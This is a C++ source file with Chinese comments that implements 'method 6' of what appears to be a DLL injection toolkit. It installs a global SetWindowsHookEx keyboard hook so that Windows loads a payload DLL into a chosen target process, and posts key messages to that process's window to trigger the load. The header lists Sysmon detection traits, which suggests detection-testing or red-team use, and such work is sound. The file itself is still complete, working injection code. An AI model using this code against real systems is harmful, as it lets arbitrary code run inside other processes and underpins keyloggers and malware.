// ════════════════════════════════════════════════════════════════
//  方法 6: 全局钩子注入 — SetWindowsHookEx
//
//  原理：
//    1. 加载 payload.dll，获取钩子回调函数地址
//    2. SetWindowsHookEx(WH_KEYBOARD, proc, dllModule, 0)
//       最后一个参数 0 = 全局钩子（所有线程）
//    3. 当目标进程收到键盘消息时，Windows 自动加载 DLL 到该进程
//    4. 发一条消息触发钩子执行
//
//  检测特征：
//    - Sysmon Event 7:  DLL 加载（ImageLoad），路径是 payload.dll
//    - Sysmon Event 10: 不触发（没有 OpenProcess）
//    - 特殊：DLL 通过 Windows 消息机制加载，不是传统注入
//    - 检测窗口枚举可以发现 SetWindowsHookEx 的调用者
// ════════════════════════════════════════════════════════════════
#include "../methods.h"

// DLL 中导出的钩子回调函数
// payload.dll 中需要导出一个函数作为钩子过程
// 这里用一个简单的 LowLevelKeyboardProc
typedef LRESULT(CALLBACK* HOOKPROC)(int, WPARAM, LPARAM);

bool Inject_GlobalHook(DWORD pid, const wchar_t* dllPath)
{
    Print(L"  [*] 全局钩子注入 → PID=%lu\n", pid);

    // ── 1. 加载 DLL 获取模块句柄 ──
    HMODULE hDll = LoadLibraryW(dllPath);
    if (!hDll)
    {
        Print(L"  [!] 加载 DLL 失败: %lu\n", GetLastError());
        return false;
    }

    // 尝试获取导出的钩子回调函数
    // 如果 DLL 没有导出钩子函数，用默认的空回调
    HOOKPROC hookProc = (HOOKPROC)GetProcAddress(hDll, "HookProc");
    if (!hookProc)
    {
        // DLL 没有导出 HookProc，用一个简单的回调
        // 实际上只要 DLL 被加载到目标进程就行，回调函数内容不重要
        Print(L"  [!] DLL 未导出 HookProc，使用默认回调\n");
        hookProc = [](int nCode, WPARAM wParam, LPARAM lParam) -> LRESULT {
            return CallNextHookEx(nullptr, nCode, wParam, lParam);
        };
    }

    Print(L"  [+] DLL 模块 @ %p\n", hDll);
    Print(L"  [+] HookProc @ %p\n", hookProc);

    // ── 2. 设置全局钩子 ──
    // WH_KEYBOARD = 2
    // dwThreadId = 0 → 全局（所有线程）
    HHOOK hHook = SetWindowsHookExW(WH_KEYBOARD, hookProc, hDll, 0);
    if (!hHook)
    {
        Print(L"  [!] SetWindowsHookEx 失败: %lu\n", GetLastError());
        FreeLibrary(hDll);
        return false;
    }
    Print(L"  [+] 全局钩子已安装 HHOOK=%p\n", hHook);

    // ── 3. 发送消息触发钩子 ──
    // 钩子在目标进程收到对应消息时才加载 DLL
    // 发一条键盘消息给目标进程的窗口
    Print(L"  [*] 发送消息触发钩子...\n");

    // 枚举目标进程的窗口
    struct EnumCtx { DWORD pid; HWND found; };
    EnumCtx ctx{ pid, nullptr };

    EnumWindows([](HWND hwnd, LPARAM lParam) -> BOOL {
        auto* pCtx = reinterpret_cast<EnumCtx*>(lParam);
        DWORD winPid = 0;
        GetWindowThreadProcessId(hwnd, &winPid);
        if (winPid == pCtx->pid && IsWindowVisible(hwnd))
        {
            pCtx->found = hwnd;
            return FALSE; // 找到了，停止枚举
        }
        return TRUE;
    }, (LPARAM)&ctx);

    if (ctx.found)
    {
        // 发送 WM_KEYDOWN + WM_KEYUP 触发钩子
        PostMessageW(ctx.found, WM_KEYDOWN, VK_F15, 0);
        PostMessageW(ctx.found, WM_KEYUP,   VK_F15, 0);
        Print(L"  [+] 已发送触发消息到窗口 %p\n", ctx.found);
    }
    else
    {
        Print(L"  [!] 找不到目标进程的窗口，钩子将在下次键盘事件时触发\n");
    }

    // 等待 DLL 加载
    Sleep(2000);

    // 清理（卸载钩子）
    UnhookWindowsHookEx(hHook);
    Print(L"  [+] 钩子已卸载\n");

    // 注意：DLL 已经被加载到目标进程，卸载钩子不会 unload DLL
    FreeLibrary(hDll); // 释放本进程的引用

    Print(L"  [✓] 全局钩子注入完成\n");
    return true;
}
